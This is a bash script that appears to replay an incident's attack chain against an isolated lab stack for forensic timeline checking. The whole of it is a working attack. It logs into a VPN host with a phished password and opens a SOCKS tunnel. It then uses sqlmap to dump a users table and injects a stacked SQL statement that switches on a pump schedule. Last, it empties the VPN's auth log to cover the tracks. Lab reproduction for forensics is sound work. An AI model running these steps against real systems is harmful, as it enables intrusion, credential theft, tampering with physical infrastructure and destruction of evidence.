#!/bin/bash
# Reproduces the INC-VA-0712 attack chain against the LEGACY lab stack only (RFC1918, isolated network).
# Every step appends to /out/incident_steps.log so the forensic timeline can be checked against ground truth.
set -uo pipefail
: "${CAPTURED_PASSWORD:?the fictitious credential captured in the phishing step}"
VPN=172.29.0.2
PANEL=http://172.28.0.20:5000
LOG=/out/incident_steps.log
SOCKS=socks5h://127.0.0.1:1080
step() { echo "$(date -Iseconds) $*" | tee -a "$LOG"; }

: > "$LOG"
step "STEP vpn_login user=coordenadora target=$VPN auth=password_only"
sshpass -p "$CAPTURED_PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -N -f -D 1080 coordenadora@"$VPN"
sleep 2

step "STEP panel_login user=coordenadora via=vpn"
curl -s -x "$SOCKS" -c /tmp/jar -o /dev/null -d "username=coordenadora&password=$CAPTURED_PASSWORD" "$PANEL/login"
cookie="$(awk '/session/ {print $7}' /tmp/jar)"

step "STEP sqli_detect tool=sqlmap target=/history param=q"
sqlmap -u "$PANEL/history?q=escola" --cookie="session=$cookie" -p q --proxy="socks5://127.0.0.1:1080" \
  --batch --flush-session --banner --dbs --output-dir=/tmp/sm 2>&1 | tee /out/sqlmap_detect.txt | tail -25

step "STEP sqli_dump table=usuarios"
sqlmap -u "$PANEL/history?q=escola" --cookie="session=$cookie" -p q --proxy="socks5://127.0.0.1:1080" \
  --batch -D public -T usuarios --dump --no-cast --output-dir=/tmp/sm 2>&1 | tee /out/sqlmap_dump.txt | tail -12

step "STEP sqli_update_schedule payload=stacked"
curl -s -x "$SOCKS" -b "session=$cookie" -o /out/stacked_response.html -w 'http=%{http_code}\n' -G "$PANEL/history" \
  --data-urlencode "q=x'; UPDATE agendamento_bomba SET ligada=true WHERE espaco='escola'; --"

bash /attack/v1_manual_check.sh

step "STEP wait_for_pump_effect seconds=${DRAIN_WAIT:-120}"
sleep "${DRAIN_WAIT:-120}"

step "STEP log_tampering target=vpn_local_auth_log"
sshpass -p "$CAPTURED_PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null coordenadora@"$VPN" \
  ': > /var/log/vaurora/auth.log; echo tampered'
step "STEP done"
